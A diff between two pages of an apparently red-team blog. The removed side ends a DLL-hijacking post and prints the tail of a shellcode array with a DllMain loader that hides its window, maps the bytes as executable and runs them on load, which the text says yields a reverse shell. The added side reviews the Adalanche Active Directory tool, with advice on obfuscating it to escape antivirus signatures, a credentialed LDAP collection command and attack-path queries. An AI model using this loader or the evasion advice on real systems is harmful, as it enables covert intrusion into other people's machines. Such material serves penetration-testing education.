-&quot;\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5&quot;
-&quot;\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;
-&quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&quot;;
-
-VOID Payload() {
- ShowWindow(GetConsoleWindow(), SW_HIDE);
-
- HANDLE mem_handle = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(buf), NULL);
-
- void* mem_map = MapViewOfFile(mem_handle, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0x0, 0x0, sizeof(buf));
-
- std::memcpy(mem_map, buf, sizeof(buf));
-
- std::cout &lt;&lt; ((int(*)())mem_map)() &lt;&lt; std::endl;
-}
-
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
-{
- switch (fdwReason)
- {
- case DLL_PROCESS_ATTACH:
-  Payload();
-  break;
- case DLL_THREAD_ATTACH:
-  break;
- case DLL_THREAD_DETACH:
-  break;
- case DLL_PROCESS_DETACH:
-  break;
- }
- return TRUE;
-}</code></pre>
-</doc-codeblock></div>
-<p>After performing DLL Hijacking with the compiled DLL, the binary executes as normal, while the shell callback is present.
-<figure class="content-center">
-    <img src="running_normal.png" alt="Application is running as expected">
-    <figcaption class="caption">Application is running as expected</figcaption>
-</figure>
-</p>
+<doc-anchor-target id="why-not-just-use-bloodhound">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#why-not-just-use-bloodhound">#</doc-anchor-trigger>
+        <span>Why not just use BloodHound?</span>
+    </h2>
+</doc-anchor-target>
+<p>Now here comes the question, why bother with Adalanche when I have BloodHound?</p>
+<p>The answer is very simple, it is always a good idea to have alternatives for specific tools. Also, alternatives creates competition and this is a fundamental process of improving both of the sides, so its a win = win situation.</p>
+<p>Additionally, as you might already know, <a href="https://github.com/BloodHoundAD/SharpHound">SharpHound</a> (The data collector for BloodHound) is extremely signatured by various security mechanisms. I am aware that the signatures and the behavioral detections can be bypassed but sometimes its not a trivial process. For Instance, it is possible to land into an environment that is extremely well network segmented, so that you cannot get a C2 implant to run and you should rely on some kind of workarounds such as bind shells on specific ports, which not all C2 framework actually supports. Additionally, its possible that the network is restricted in such way, that you cannot just execute the python collector.  On top of that, if the segmentation is combined with enforced endpoint protection, it can become even more challenging. This just makes the things more complicated and can effectively lose a day or two into just getting the basic AD enumeration.</p>
+<p>On the other hand, Adalanche is a tool that can work as both a collector and a visualizer at the same time, while it is extremely evasive. Imagining the previous restricted scenario, if Adalanche is execute from a compromised machine with network access to the LDAP server,  it is less likely to get detected and blocked.</p>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
+    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-500 dark:text-blue-400" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+<p>When operating from C2 framework, the Adalanche binary can be executed with any PE-execution module, if your C2 supports such!</p>
+        </div>
+    </div>
+</div>
+<p>[BIG DISCLAIMER]
+I am aware that there are always various workarounds for all scenarios. The goal of this blog is not to question them, but to discuss and analyze the Adalanche tool.</p>
+<p>Now, let&#x27;s get an idea of what Adalanche actually looks like.</p>
+<doc-anchor-target id="adalanche-overview">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#adalanche-overview">#</doc-anchor-trigger>
+        <span>Adalanche Overview</span>
+    </h2>
+</doc-anchor-target>
+<p>Adalanche is go-written tool for collecting and analyzing data from Active Directory. It is capable of extracting potential attack vectors such as <a href="https://lsecqt.github.io/Red-Teaming-Army/active-directory/attacks/unleashing-the-power-of-unconstrained-delegation/">unconstrained delegation</a>, ESC1, outdated servers, users with administrative privileges and more. It is extremely fast and compatible with each modern Operating System (OS).</p>
+<p>One of the coolest features about Adalanche is that it is self-sufficient, which means, you do not need:</p>
+<ul>
+<li>Database (like Neo4j)</li>
+<li>Specific engine or runtime installed (like dotnet runtime)</li>
+<li>Additional software (like a web server)</li>
+</ul>
+<p>All you need is the <a href="https://github.com/lkarlslund/Adalanche/releases">compiled binary</a> and luck that you are in a vulnerable environment.
+Since the Adalanche is go-written, the same code can be compiled for both windows and *nix systems.</p>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
+    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-500 dark:text-blue-400" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+<p>It is always a good idea to obfuscate the code and compile it yourself. Currently (January, 2024) the tool does not get signatured but most likely this will change in the near future!</p>
+        </div>
+    </div>
+</div>
+<p>Adalanche can be run directly, with no arguments if it is launched from a domain joined windows machine. On the other hand it can also mimic <a href="https://github.com/dirkjanm/BloodHound.py">bloodhound.py</a>, scraping the LDAP from a machine with network access to the Domain Controller. It then stores the gathered data into a folder called <code v-pre>data</code>, which can be analyzed in the future. Now let&#x27;s analyze the different methods on how to get it running!</p>
+<doc-anchor-target id="case-1-i-am-operating-from-a-domain-joined-windows-computer">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#case-1-i-am-operating-from-a-domain-joined-windows-computer">#</doc-anchor-trigger>
+        <span>Case 1: I am operating from a domain joined Windows computer</span>
+    </h3>
+</doc-anchor-target>
+<p>Adalanche is capable of detecting the context of the current user. In case you are operating from a domain joined machine, and from the context of a domain user, you do not need to supply any arguments! In this scenario it is enough to just download and execute the binary.</p>
+<p>This will perform all the scraping automatically, then Adalanche will automatically analyze the collected data and finally, it will host the results on <code v-pre>127.0.0.1:8080</code> while navigating your default browser to the web view.</p>
+<p>If everything went smooth, you should see something like this:</p>
 <p><figure class="content-center">
-    <img src="shell.png" alt="Receiving the reverse shell">
-    <figcaption class="caption">Receiving the reverse shell</figcaption>
+    <img src="adalanche_main_screen.png" alt="Entry screen of adalanche">
+    <figcaption class="caption">Entry screen of adalanche</figcaption>
+</figure>
+</p>
+<doc-anchor-target id="case-2-i-am-operating-from-a-host-with-vpn-access-and-ad-credentials">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#case-2-i-am-operating-from-a-host-with-vpn-access-and-ad-credentials">#</doc-anchor-trigger>
+        <span>Case 2: I am operating from a host with VPN access and AD credentials</span>
+    </h3>
+</doc-anchor-target>
+<p>Adalanche is also capable of scanning and extracting data from the Active Directory remotely.
+In this scenario, it is required to have network visibility to the LDAP servers as well as a valid pair of credentials for the Active Directory.</p>
+<p>The Adalanche binary can now be used in 2 modes:</p>
+<ul>
+<li>collect</li>
+<li>analyze</li>
+</ul>
+<p>The first mode will perform the data collection via querying the LDAP service. After completion, again, all of the results will be stored in a folder called <code v-pre>data</code> unless you specify something different.
+All of the needed options can be found on the <a href="https://github.com/lkarlslund/Adalanche">docs</a> or by running:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">./adalanche help collect activedirectory
+
+11:24:06.425  INFORMA  Adalanche Open Source v2024.1.11 (commit 0161570), (c) 2020-2024 Lars Karlslund, This program comes with ABSOLUTELY NO WARRANTY
+Collects information from Active Directory
+
+Usage:
+  adalanche collect activedirectory [flags]
+
+Flags:
+      --adexplorerboost         Boost ADexplorer performance by using loading the binary file into RAM before decoding it (default true)
+      --adexplorerfile string   Import AD objects from SysInternals ADexplorer dump
+      --attributes string       Comma seperated list of attributes to get, * = all, or a comma seperated list of attribute names (expert) (default &quot;*&quot;)
+      --authdomain string       domain for authentication, if using ntlm auth
+      --authmode string         Bind mode: unauth/anonymous, basic/simple, digest/md5, kerberoscache, ntlm, ntlmpth (password is hash), negotiate/sspi (default &quot;ntlm&quot;)
+      --autodetect              Try to autodetect as much as we can, this will use environment variables and DNS to make this easy (default true)
+      --configuration string    Collect Active Directory Configuration (default &quot;auto&quot;)
+      --domain string           domain suffix to analyze (contoso.local, auto-detected if not supplied)
+      --gpopath string          Override path to GPOs, useful for non Windows OS'es with mounted drive (/mnt/policies/ or similar), but will break ACL feature
+      --gpos string             Collect Group Policy file contents (default &quot;auto&quot;)
+  -h, --help                    help for activedirectory
+      --ignorecert              Disable certificate checks
+      --ldapdebug               Enable LDAP debugging
+      --nosacl                  Request data with NO SACL flag, allows normal users to dump ntSecurityDescriptor field (default true)
+      --objects string          Collect Active Directory Objects (users, groups etc) (default &quot;auto&quot;)
+      --other string            Collect other Active Directory contexts (typically integrated DNS zones) (default &quot;auto&quot;)
+      --pagesize int            Number of objects per request to collect (increase for performance, but some DCs have limits) (default 1000)
+      --password string         password to connect with ex. --password hunter42 (use ! for blank password)
+      --port int                LDAP port to connect to (389 or 636 typical, -1 for auto based on tlsmode) (default -1)
+      --purgeolddata            Purge existing data from the datapath if connection to DC is successfull
+      --schema string           Collect Active Directory Schema (default &quot;auto&quot;)
+      --server stringArray      DC to connect to, use IP or full hostname ex. -dc=&quot;dc.contoso.local&quot;, random DC is auto-detected if not supplied
+      --tlsmode string          Transport mode (TLS, StartTLS, NoTLS) (default &quot;NoTLS&quot;)
+      --username string         username to connect with (someuser@contoso.local)
+
+Global Flags:
+      --cpuprofile                Save CPU profile from start to end of processing in datapath
+      --cpuprofiletimeout int32   CPU profiling timeout in seconds (0 means no timeout)
+      --datapath string           folder to store and read data (default &quot;data&quot;)
+      --embeddedprofiler          Start embedded Go profiler on localhost:6060
+      --fgtrace                   Save CPU trace start to end of processing in datapath
+      --logfile string            File to log to
+      --logfilelevel string       Log file log level (default &quot;info&quot;)
+      --loglevel string           Console log level (default &quot;info&quot;)
+      --logzerotime               Logged timestamps start from zero when program launches
+11:24:06.436  INFORMA  Terminating successfully
+</code></pre>
+</doc-codeblock></div>
+<p>By following the options, this exemplary command can collect the data from the Active Directory:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">./adalanche collect activedirectory --tlsmode tls --ignorecert --domain domain.local --authdomain DOMAIN --username joe --password joepass --server DCIP</code></pre>
+</doc-codeblock></div>
+<p>After this command finishes, the <code v-pre>data</code> folder will be present in your current working directory.</p>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
+    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-500 dark:text-blue-400" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+<p>Since all of the collected AD information is stored into that <code v-pre>data</code> folder, you can also zip and ship it somewhere else. Keep in mind that the dump can be analyzed offline as soon as the Adalanche binary is present. As already mentioned, the same binary can be used for both collection and analyzing the data.</p>
+        </div>
+    </div>
+</div>
+<p>When you are ready to analyze the results and generate a web view, you can do so by running:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">./adalanche analyze</code></pre>
+</doc-codeblock></div>
+<p>If everything is running as expected, you should again see the initial screen of Adalanche:
+<figure class="content-center">
+    <img src="adalanche_main_screen.png" alt="Entry screen of adalanche">
+    <figcaption class="caption">Entry screen of adalanche</figcaption>
+</figure>
+</p>
+<doc-anchor-target id="adalanche-usage">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#adalanche-usage">#</doc-anchor-trigger>
+        <span>Adalanche Usage</span>
+    </h2>
+</doc-anchor-target>
+<p>Adalanche UI is divided into 3 parts:</p>
+<ul>
+<li>Object explorer on the left</li>
+<li>Nodes visualization settings on the right</li>
+<li>LDAP querying tool centered on the bottom.</li>
+</ul>
+<p>On the Object explorer you can observe and analyze various objects, including present users, their groups, machines, Active Directory configurations and more.</p>
+<p><figure class="content-center">
+    <img src="object_explorer.png" alt="Object explorer">
+    <figcaption class="caption">Object explorer</figcaption>
+</figure>
+</p>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
+    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-500 dark:text-blue-400" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+<p>The data from the object explorer is the raw data from the LDAP server. Here you can find the values in various object fields, such as object description</p>
+        </div>
+    </div>
+</div>
+<p>On the right, you can tweak how the Adalanche should look like, but I personally did not spend much time on it since I was happy with the defaults.</p>
+<p><figure class="content-center">
+    <img src="options.png" alt="Adalanche visual options">
+    <figcaption class="caption">Adalanche visual options</figcaption>
+</figure>
+</p>
+<p>It is in the LDAP querying tool where it gets interesting.</p>
+<p><figure class="content-center">
+    <img src="ldap_query_tool.png" alt="LDAP query section">
+    <figcaption class="caption">LDAP query section</figcaption>
+</figure>
+</p>
+<p>Compared to BloodHound, Adalanche is not using any database engines for storing the results. It is based entirely on LDAP to perform any visualization and analysis over the collected data (which is purely stored on the local file system). To visualize the results, Adalanche uses web view, which can be configured with the option <code v-pre>--bind 'IP:PORT'</code>.</p>
+<p>This behavior has its pros and cons such as :</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Pros</th>
+<th>Cons</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Extremely easy to migrate and share</td>
+<td>Extremely easy to lose the data</td>
+</tr>
+<tr>
+<td>No dependencies other then the Adalanche binary</td>
+<td>Storing files on the local FS can lead to super easy signatures</td>
+</tr>
+<tr>
+<td>No collector / db engine version incompatibility</td>
+<td>No Internet Explorer support, wont run smooth on old machines</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>Adalanche comes with the following predefined LDAP queries for visualizing nodes and searching for attack paths:</p>
+<p><figure class="content-center">
+    <img src="default_queries_ldap.png" alt="Builtin LDAP queries">
+    <figcaption class="caption">Builtin LDAP queries</figcaption>
+</figure>
+</p>
+<p>From these, you may notice that a lot of the queries are actually familiar from BloodHound (such as Kerberoastable users, DC Sync users and so on).</p>
+<p>One of the coolest parts about Adalanche, is that when you execute one of the queries, you get its raw syntax inside the LDAP querying section, from where you can modify and update the query to suit your needs.</p>
+<p><figure class="content-center">
+    <img src="udq.png" alt="Query showing Unconstrained Delegation non-DC machines">
+    <figcaption class="caption">Query showing Unconstrained Delegation non-DC machines</figcaption>
+</figure>
+</p>
+<p>Additionally, the <code v-pre>Start Query</code>, <code v-pre>Middle Query</code> and <code v-pre>End Query</code> are query separators, which means, that you can implement your own custom nested queries for finding various attack paths, misconfigurations and vulnerabilities.</p>
+<p>Of course, one negative aspect would be that you need to be doing good with LDAP in order to implement anything custom and to get the most out of Adalanche, but on the other hand, I found out that the default queries are working pretty nice. While I find the output from some of them confusing, others like <code v-pre>Who can change GPOs</code>, <code v-pre>ESC1 vulnerable certificate templates</code> and <code v-pre>Who can dump SAM/SYSTEM</code> can be extremely easy to understand and useful.</p>
+<p>Lets analyze the above executed query: <code v-pre>(&amp;(type=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!userAccountControl:1.2.840.113556.1.4.803:=8192))</code> which is designed to show all computers which are marked for Unconstrained Delegation, and are not Domain Controllers. While at first the output can be a little messy, it makes sense when you start reading the lines.</p>
+<p>Similar to BloodHound, when you click on the paths between objects, you can get additional details about various attributes and relationships. It is not as informative as BloodHound(the path does not give exploitation guides), but still can be quite useful when you are already aware of the most common AD attacks. For example, when you see a red link between nodes, Adalanche claims that there are dangerous permissions between them.</p>
+<p><figure class="content-center">
+    <img src="ann_permissions.png" alt="Ann Rogers has AllExtendedRights permissions over SQL02 machine">
+    <figcaption class="caption">Ann Rogers has AllExtendedRights permissions over SQL02 machine</figcaption>
+</figure>
+</p>
+<p>By following the same logic, we can understand that the <code v-pre>SQL02</code> is marked for Unconstrained Delegation, because its node is bigger and marked in red, compared to other machine accounts in the graph:</p>
+<p><figure class="content-center">
+    <img src="machine_accounts.png" alt="Exact query match in red, in this case SQL02 is allowed for Unconstrained Delegation">
+    <figcaption class="caption">Exact query match in red, in this case SQL02 is allowed for Unconstrained Delegation</figcaption>
+</figure>
+</p>
+<p>Additionally, the orange links most of the times mean that the object is a member of specific group, while the white usually means that there is some form of connection between objects which is not dangerous or exploitable.</p>
+<p><figure class="content-center">
+    <img src="admin_group.png" alt="User admin is a member of the Administrators group, visualized with orange link">
+    <figcaption class="caption">User admin is a member of the Administrators group, visualized with orange link</figcaption>
+</figure>
+</p>
+<p>With that, Adalanche has everything needed to find misconfigurations and vulnerabilities in the scope of the Active Directory. I know that there are a lot of features that are missing, compared to BloodHound, but still the essentials are here. One of the features I think Adalanche is lacking, is the exploitation docs on the node paths. Additionally, I found Adalanche hard to navigate and analyze specific single objects. Compared to BloodHound, where you can just type the object into the search box, here you would need to use LDAP queries. For example, in order to find a specific user, you can use the following LDAP query: <code v-pre>(&amp;(objectCategory=person)(objectClass=user)(sAMAccountName=username))</code></p>
+<p><figure class="content-center">
+    <img src="user.png" alt="Querying the user emma, visualizing all objects that can directly influence her.">
+    <figcaption class="caption">Querying the user emma, visualizing all objects that can directly influence her.</figcaption>
+</figure>
+</p>
+<p>Other features such as <code v-pre>what can this node pwn</code> and <code v-pre>what can pwn this node</code> I found to be extremely useful and practical. These options can be utilized into setting up a target or a starting point.</p>
+<p><figure class="content-center">
+    <img src="pwnoptions.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>The whole idea of these options is to find attack paths to or from specific objects.</p>
+<p>In this scenario, our user emma does not have direct dangerous and abusable ACLs toward any object in the domain.
+<figure class="content-center">
+    <img src="emma_no_privilege.png" alt="Results from What can this node pwn? query">
+    <figcaption class="caption">Results from <code v-pre>What can this node pwn?</code> query</figcaption>
+</figure>
+</p>
+<p>However, various objects can effectively influence and control emma:
+<figure class="content-center">
+    <img src="emma_pwned.png" alt="Results from Who can pwn this node? query">
+    <figcaption class="caption">Results from <code v-pre>Who can pwn this node?</code> query</figcaption>
+</figure>
+</p>
+<p>Additionally, the options <code v-pre>Set as route target</code> and <code v-pre>Route to target</code> can be used to effectively display the attack path:</p>
+<p><figure class="content-center">
+    <img src="route.png" alt="Results from setting emma as a target and running Route to target from Enterprise Admins group node">
+    <figcaption class="caption">Results from setting emma as a target and running <code v-pre>Route to target</code> from Enterprise Admins group node</figcaption>
 </figure>
 </p>
 <doc-anchor-target id="conclusion">
@@ -718,18 +676,15 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
         <span>Conclusion</span>
     </h2>
 </doc-anchor-target>
-<p>As mentioned before, DLL Hijacking on its own is a valid finding and often during pentests, it can be enough just to prove that the targeted application is vulnerable. However, in more complex cases, you may need to operate more stealthy.</p>
-<p>Since the &quot;Classical DLL Hijacking&quot; is corrupting the workflow of the targeted application, this can be a huge IOC (Indicator Of Compromise). To evade being detected, before implementing any custom evasive payloads, you have to make sure that your techniques do not disrupt anyone&#x27;s environment. While DLL Proxying may sound more complicated and requires additional programming skills, it is a nice way to weaponize the DLL Hijacking attack.</p>
-<p>More on AV / EDR evasion blogs are yet to come!</p>
-<p>Thank you for your attention, I really hope this blog was useful, if so, you can support me on:</p>
-<ul>
-<li><a href="https://www.patreon.com/Lsecqt">Patreon</a></li>
-<li><a href="https://www.buymeacoffee.com/lsecqt">BuyMeACoffee</a></li>
-<li><a href="https://www.youtube.com/@Lsecqt">Youtube</a></li>
-<li><a href="https://twitter.com/lsecqt">Twitter</a></li>
-<li><a href="https://github.com/lsecqt">Github</a></li>
-</ul>
-<p>Also make sure to join the <a href="https://discord.gg/dWCe5ZMvtQ">Red Teaming Army</a> Discord channel.</p>
+<p>Now it is your turn to try out the tool and decide for yourself if it is worth it or not!
+In my opinion, compared to BloodHound, Adalanche is worst at visuals but still can present useful information and real attack paths.</p>
+<p>While it can be initially confusing I think it is a great alternative which has its own pros and cons. I personally find the architecture pretty amazing and well done! The ability to be that flexible and evasive is something that must be credited, and we also need to acknowledge that the project is actively being developed and supported!</p>
+<p><figure class="content-center">
+    <img src="metadefender.png" alt="Metadefender scan results">
+    <figcaption class="caption">Metadefender scan results</figcaption>
+</figure>
+</p>
+<p>I highly encourage you to try it out on your own and decide whether it is useful in your cases.</p>
 
                                 
                                 <!-- Required only on API pages -->
@@ -739,16 +694,23 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../active-directory/enumeration/visualizing-acls-with-adalanche/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../active-directory/attacks/unleashing-the-power-of-unconstrained-delegation/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                                                <span class="block mt-1">Visualizing AC​Ls with Adalanche</span>
+                                                <span class="block mt-1">Unleashing the Power of Unconstrained Delegation</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../malware-development/weaponizing-dll-hijacking-via-dll-proxying/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Weaponizing DLL Hijacking via DLL Proxying</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
                                     </div>
                                 </nav>
                             </footer>
@@ -789,6 +751,6 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 
     <div id="docs-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Weaponizing DLL Hijacking via DLL Proxying", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Visualizing ACLs with Adalanche", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
